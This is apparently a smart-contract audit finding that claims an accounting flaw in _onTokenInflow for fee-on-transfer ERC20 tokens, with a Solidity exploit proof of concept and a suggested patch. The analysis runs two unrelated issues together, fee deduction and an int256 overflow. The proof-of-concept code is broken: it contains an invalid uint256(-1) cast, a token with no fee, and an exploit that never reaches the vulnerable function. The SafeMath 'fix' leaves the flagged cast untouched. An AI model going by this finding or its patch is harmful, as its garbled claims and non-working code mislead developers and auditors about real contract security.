# Incorrect Token Balance Accounting for Fee-on-Transfer ERC20 Tokens

## Summary
The vulnerability arises from the contract's incorrect assumption that the entire '**_amount**' of ERC20 tokens indicated is credited to its balance during a transfer, failing to account for potential transfer fees deducted by certain fee-on-transfer ERC20 tokens. This flawed assumption leads to an internal accounting error as the contract's '**_onTokenInflow**' function records the full '**_amount**' as received, disregarding the actual lesser amount credited post-fee.
## Vulnerability Detail
The root cause of the vulnerability "Incorrect Token Balance Accounting for Fee-on-Transfer ERC20 Tokens" in the provided code is that the function **_onTokenInflow()** on lines 265 to 271 does not correctly account for the transfer fee that may be deducted from the token amount when a transfer occurs.

When a transfer of ERC20 tokens with a fee-on-transfer mechanism takes place, the actual amount received by the recipient may be less than the amount sent due to the deduction of the transfer fee. However, in the code snippet provided, the function **_onTokenInflow()** only records the amount of tokens received without considering the deduction of the transfer fee. This can lead to incorrect accounting of the token balance, as the deducted fee is not taken into account.

The vulnerability in the code lies in line 269 where the function recordChange is called with the parameter int256(_amount). This conversion from **uint256** to **int256** could potentially overflow into a negative value, leading to incorrect token balance accounting for fee-on-transfer ERC20 tokens.

To exploit this vulnerability, an attacker could create a malicious ERC20 token contract that implements a fee-on-transfer mechanism. By transferring a large amount of tokens to the smart contract using the **_onTokenInflow** function, the attacker could potentially cause an overflow in the conversion from **uint256** to **int256**, resulting in a negative value being recorded for the token balance. This could allow the attacker to manipulate the token balance and potentially steal tokens from the smart contract.

Proof of Concept (PoC) code:

```solidity
// Malicious ERC20 token contract
pragma solidity ^0.8.0;

contract MaliciousToken {
    string public name = "MaliciousToken";
    string public symbol = "MT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * 10 ** uint256(decimals);
    mapping(address => uint256) balances;

    constructor() {
        balances[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
}

// Smart contract with vulnerability
contract VulnerableContract {
    mapping(address => int256) public tokenBalances;

    function _onTokenInflow(address _token, uint256 _amount) internal {
        int256 convertedAmount = int256(_amount); // Vulnerability here
        tokenBalances[_token] += convertedAmount;
    }

    function getBalance(address _token) public view returns (int256) {
        return tokenBalances[_token];
    }
}

// Exploit the vulnerability
contract Exploit {
    VulnerableContract vulnerableContract = VulnerableContract(0x123...); // Address of the vulnerable contract
    MaliciousToken maliciousToken = new MaliciousToken();

    function exploit() public {
        maliciousToken.transfer(address(vulnerableContract), uint256(-1)); // Transfer a large amount to trigger overflow
        int256 balance = vulnerableContract.getBalance(address(maliciousToken));
        require(balance < 0, "Vulnerability exploited successfully");
    }
}
```
In this PoC, the **MaliciousToken** contract is created with a total supply of tokens. The **VulnerableContract** has the vulnerable **_onTokenInflow** function that can be exploited by the **Exploit** contract. The **exploit** function transfers a large amount of tokens to the vulnerable contract, triggering an overflow and exploiting the vulnerability.

Manual Review

## Recommendation
The vulnerability in the code lies in the way the token balance accounting is handled. When tokens are transferred, the balance is recorded as an unsigned integer, which could potentially overflow into a negative value if the amount is large enough. This can lead to incorrect balance calculations and potentially cause unexpected behavior in the smart contract.

To fix this issue, the token balance accounting should be updated to handle the possibility of overflow. One way to address this is by using a safe math library to perform arithmetic operations on the token balances. This ensures that any potential overflow or underflow is prevented, and the calculations are done safely.

Here is an example of how the code can be patched to address the vulnerability:

```solidity
pragma solidity ^0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
}

contract YourContract {
    using SafeMath for uint256;

    function _onTokenInflow(address _token, uint256 _amount) internal {
        Limiter storage limiter = tokenLimiters[_token];

        limiter.recordChange(int256(_amount), WITHDRAWAL_PERIOD, TICK_LENGTH);
        emit AssetInflow(_token, _amount);
    }
}
```
By incorporating the **SafeMath** library and using safe arithmetic operations, the vulnerability related to incorrect token balance accounting for fee-on-transfer ERC20 tokens can be mitigated.
